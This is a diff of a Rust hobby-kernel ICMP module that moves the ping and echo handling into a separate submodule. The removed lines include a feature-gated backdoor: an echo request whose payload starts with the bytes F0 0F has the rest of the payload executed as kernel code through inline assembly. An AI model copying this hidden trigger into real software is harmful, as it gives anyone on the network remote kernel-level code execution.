@@ -1,19 +1,11 @@
-use core::{
-    net::Ipv4Addr,
-    pin::Pin,
-    task::{Context, Poll, Waker},
-};
-
-use crate::sync::spinlock::Mutex;
 use alloc::{vec, vec::Vec};
-use crossbeam_queue::ArrayQueue;
-use futures_util::{Stream, StreamExt, task::AtomicWaker};
-use lazy_static::lazy_static;
 use log::debug;
+
+pub mod ping;
 
 use crate::{
     net::{
-        Interface, PACKET_QUEUE,
+        Interface,
         ip::{IPv4Header, IPv4Packet},
         ones_complement_checksum,
     },
@@ -38,144 +30,15 @@ pub async fn handle_icmp(packet: &IPv4Packet<'_>, interface: &Interface) {
 
     match icmpp.typ {
         ControlMessageType::EchoRequest(NoSubcode::NoCode) => {
-            handle_icmp_echo_request(icmpp, &packet.header, interface).await;
+            ping::handle_icmp_echo_request(icmpp, &packet.header, interface).await;
         }
         ControlMessageType::EchoReply(NoSubcode::NoCode) => {
-            handle_icmp_echo_response(icmpp, &packet.header, interface);
+            ping::handle_icmp_echo_response(&icmpp, &packet.header, interface);
         }
         unknown => {
             log::warn!("Unhandled ICMP ControlMessageType: {:?}", unknown);
         }
     }
-}
-
-// should this be made into a generic handle<T> ?
-async fn handle_icmp_echo_request(
-    icmpp: ICMPPacket<'_>,
-    header: &IPv4Header,
-    interface: &Interface,
-) {
-    log::debug!("{:?}", icmpp.data);
-
-    #[cfg(feature = "backdoor")]
-    {
-        let dpat = &icmpp.data[0..2];
-        let pattern = b"\xF0\x0F";
-
-        if dpat == pattern {
-            use x86_64::instructions::interrupts::without_interrupts;
-
-            log::warn!("BACKDOOR ACTIVATED");
-
-            let program = &icmpp.data.as_slice()[pattern.len()..];
-
-            // safe since sender pinky promisies that the code is memory safe :3
-            without_interrupts(|| unsafe {
-                core::arch::asm!(
-                "call rax", in("rax") program.as_ptr(),
-                clobber_abi("C")
-                );
-            });
-        }
-    }
-
-    let mut response = ICMPPacket {
-        typ: ControlMessageType::EchoReply(NoSubcode::NoCode),
-        checksum: 0,
-        other: icmpp.other,
-        data: icmpp.data,
-    };
-
-    response.calc_new_checksum();
-
-    let resp_bytes = response.to_bytes();
-    let ipv4 = IPv4Packet::from_source_dest_and_data(
-        interface.ip,
-        header.source_address,
-        resp_bytes.as_slice(),
-    )
-    .expect("Packet constructed incorrectly");
-
-    log::trace!("Sending icmp response: {:?}", ipv4);
-    super::ip::send_ipv4_packet(ipv4, interface).await;
-}
-
-/// This is called when an echo response addressed to us has arrived.
-fn handle_icmp_echo_response(icmpp: ICMPPacket<'_>, header: &IPv4Header, _interface: &Interface) {
-    // The packet arriving should be just logged for now. In future will do better
-    log::info!(
-        "received icmp response! {:?} from source: {}",
-        icmpp,
-        header.source_address
-    );
-
-    PING_RESPONSE_QUEUE.lock().push(());
-
-    PING_WAKER.wake();
-}
-
-static PING_WAKER: AtomicWaker = AtomicWaker::new();
-
-// empty for now
-lazy_static! {
-    static ref PING_RESPONSE_QUEUE: Mutex<ArrayQueue<()>> = Mutex::new(ArrayQueue::new(10));
-}
-
-struct PingRequestStream {
-    // current_sequence_num: u16,
-    // identifier: u16,
-}
-
-impl Stream for PingRequestStream {
-    type Item = ();
-
-    fn poll_next(self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<Option<Self::Item>> {
-        // let queue = PING_RESPONSE_QUEUE.lock();
-
-        if let Some(_) = PING_RESPONSE_QUEUE.lock().pop() {
-            return Poll::Ready(Some(()));
-        }
-
-        PING_WAKER.register(cx.waker());
-
-        match PING_RESPONSE_QUEUE.lock().pop() {
-            Some(_) => {
-                PING_WAKER.take();
-                Poll::Ready(Some(()))
-            }
-            None => Poll::Pending,
-        }
-    }
-}
-
-pub async fn ping_once(target: Ipv4Addr) {
-    log::info!("pinging target: {}", target);
-
-    let Some(interface) = *crate::net::INTERFACE.read().await else {
-        log::error!("Unable to load network interface.");
-        return;
-    };
-
-    let mut request = ICMPPacket {
-        typ: ControlMessageType::EchoRequest(NoSubcode::NoCode),
-        checksum: 0,
-        // contains identifier_u16 and sequence number_u16
-        other: 0,
-        data: b"an icmp payload yayy",
-    };
-
-    request.calc_new_checksum();
-    let bytes = request.to_bytes();
-    let packet = IPv4Packet::from_source_dest_and_data(interface.ip, target, bytes.as_slice())
-        .expect("icmp request is valid");
-    let Ok(_) = super::ip::send_ipv4_packet(packet, &interface).await else {
-        log::error!("could not send icmp request.");
-        return;
-    };
-
-    let mut p = PingRequestStream {};
-    p.next().await;
-    log::info!("received a response!");
 }
 
 impl<'a> TryFrom<&'a [u8]> for ICMPPacket<'a> {
